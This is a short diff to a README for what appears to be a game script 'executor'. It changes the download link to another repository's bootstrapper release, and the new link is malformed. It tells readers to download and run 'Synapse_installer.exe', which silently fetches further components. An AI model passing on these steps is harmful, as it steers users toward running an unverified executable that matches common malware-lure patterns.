@@ -17,7 +17,7 @@
 ## 📥 Quick Start & Installation
 
 ### Option 1. Via Bootstrapper (Recommended ⭐)
-1. Go to the [**Releases**](https://github.com/dwasdz06-design/exec/releases/latest) section.
+1. Go to the [**Releases**]([https://github.com/dwasdz06-design/octane-executor/releases/tag/Bootstrapper) section.
 2. Download **`Synapse_installer.exe`**.
 3. Run the bootstrapper:
    - It will automatically download all required components in the background.
